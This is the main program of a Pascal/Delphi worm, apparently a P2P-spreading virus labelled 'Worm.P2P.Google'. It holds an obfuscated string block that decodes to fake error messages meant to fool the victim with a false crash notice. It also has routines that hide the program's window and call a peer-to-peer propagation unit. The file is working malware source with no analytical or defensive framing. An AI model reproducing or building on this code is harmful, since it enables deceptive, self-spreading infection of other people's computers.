   PROGRAM Google;

   USES
     sClasses IN 'ACLUnits\SCLASSES.PAS',
     Registry IN 'ACLUnits\REGISTRY.PAS',
     IniFiles IN 'ACLUnits\INIFILES.PAS',
     AclUtils IN 'ACLUnits\ACLUTILS.PAS',
     P2P      IN 'P2P.PAS',
     Utils    IN 'UTILS.PAS',
     windows;

   VAR
     Msg                   : TMsg;
     hMutex                : THandle;
     ApplicationHandle     : HWND;
     WABExists             : BOOL;
     ErrorMessages         : XArray;
     NumberOfErrorMessages : WORD;

   CONST

     TErrorMessages : pChar =
                       #184+#204+#205+#215+#132+#170+#205+#208+#201+#132+#205+#215+
                       #132+#167+#211+#214+#214+#217+#212+#216+#201+#200+#133+#144+
                       #184+#204+#205+#215+#132+#183+#211+#202+#216+#219+#197+#214+
                       #201+#132+#210+#201+#201+#200+#132+#209+#211+#214+#201+#132+
                       #218+#205+#214+#216+#217+#197+#208+#132+#209+#201+#209+#211+
                       #214+#221+#133+#144+#169+#214+#214+#211+#214+#158+#132+#176+
                       #211+#219+#132+#183+#221+#215+#216+#201+#209+#132+#180+#201+
                       #214+#202+#211+#214+#209+#197+#210+#199+#201+#133+#144+#169+
                       #214+#214+#211+#214+#158+#132+#167+#197+#210+#132+#178+#211+
                       #216+#132+#170+#205+#210+#200+#132+#167+#211+#210+#202+#205+
                       #203+#146+#173+#178+#173+#133+#144+#184+#204+#205+#215+#132+
                       #215+#211+#202+#216+#219+#197+#214+#201+#132+#210+#201+#201+
                       #200+#132+#177+#183+#173+#179+#151+#150+#146+#168+#176+#176+
                       #133+#144+#165+#212+#212+#208+#205+#199+#197+#216+#205+#211+
                       #210+#132+#197+#216+#216+#201+#209+#212+#216+#201+#200+#132+
                       #216+#211+#132+#214+#201+#197+#200+#132+#209+#201+#209+#211+
                       #214+#221+#132+#197+#216+#132+#148+#220+#170+#170+#170+#170+
                       #170+#170+#170+#170+#204+#133+#144+#184+#204+#201+#132+#215+
                       #221+#215+#216+#201+#209+#132+#199+#197+#210+#210+#211+#216+
                       #132+#202+#205+#210+#200+#132+#216+#204+#201+#132+#202+#205+
                       #208+#201+#132+#215+#212+#201+#199+#205+#202+#205+#201+#200+
                       #146+#144+#183+#216+#197+#199+#207+#132+#211+#218+#201+#214+
                       #202+#208+#211+#219+#146+#144+#167+#197+#210+#210+#211+#216+
                       #132+#197+#208+#208+#211+#199+#197+#216+#201+#132+#209+#201+
                       #209+#211+#214+#221+#146+#144+#165+#132+#202+#197+#216+#197+
                       #208+#132+#201+#220+#199+#201+#212+#216+#205+#211+#210+#132+
                       #148+#154+#132+#204+#197+#215+#132+#211+#199+#199+#217+#214+
                       #214+#201+#200+#132+#197+#216+#132+#160+#165+#157+#148+#148+
                       #162+#158+#160+#165+#148+#157+#155+#151+#166+#170+#168+#162+
                       #146+#144+#170+#197+#216+#197+#208+#132+#169+#220+#199+#201+
                       #212+#216+#205+#211+#210+#132+#148+#169+#132+#204+#197+#215+
                       #132+#211+#199+#199+#217+#214+#214+#201+#200+#132+#197+#216+
                       #132+#209+#201+#209+#211+#214+#221+#132+#197+#200+#200+#214+
                       #201+#215+#215+#132+#205+#210+#132+#209+#211+#200+#217+#208+
                       #201+#132+#186+#220+#200+#132+#173+#179+#183+#140+#148+#152+
                       #141+#132+#143+#132+#209+#201+#209+#211+#214+#221+#132+#197+
                       #200+#200+#214+#201+#215+#215+#146+#144+#165+#132+#202+#197+
                       #216+#197+#208+#132+#201+#220+#199+#201+#212+#216+#205+#211+
                       #210+#132+#148+#169+#132+#204+#197+#215+#132+#211+#199+#199+
                       #217+#214+#214+#201+#200+#132+#197+#216+#132+#148+#148+#150+
                       #156+#158+#167+#148+#150+#165+#148+#150+#148+#149+#132+#205+
                       #210+#132+#186+#188+#168+#132+#173+#179+#183+#140+#148+#152+
                       #141+#143+#148+#148+#148+#148+#149+#170+#167+#157;

   FUNCTION GetConOutputHandle : THandle;
   BEGIN
     RESULT:=GetStdHandle(STD_OUTPUT_HANDLE)
   END;

   PROCEDURE HideProject;
   BEGIN
     ShowWindow(ApplicationHandle,SW_HIDE);
     SetWindowLong(ApplicationHandle,GWL_EXSTYLE,GetWindowLong(ApplicationHandle,GWL_EXSTYLE) OR WS_EX_TOOLWINDOW);
     ShowWindow(ApplicationHandle,SW_SHOW);
   END;

   PROCEDURE StartWorm;
   VAR
     FirstRun2 : BOOL;

   BEGIN
     InitProcesses;
     SetWinPath;
     NumberOfErrorMessages:=DecodeStrings(TErrorMessages,ErrorMessages);
     ApplicationHandle:=GetConOutputHandle;
     ApplicationName:=ParamStr(0);
     IF Pos('STARTUP',UpperCase(ApplicationName))=0 THEN MessageBox(ApplicationHandle,pChar(ErrorMessages[Random(NumberOfErrorMessages-1)+1]),'Error',MB_ICONHAND);
     InitPeerToPeer;
     HideProject;
   END;

   BEGIN
     hMutex:=CreateMutexA(NIL,False,'Worm.P2P.Google');
     IF WaitForSingleObject(hMutex,0)<>Wait_TimeOut THEN StartWorm;
   END.
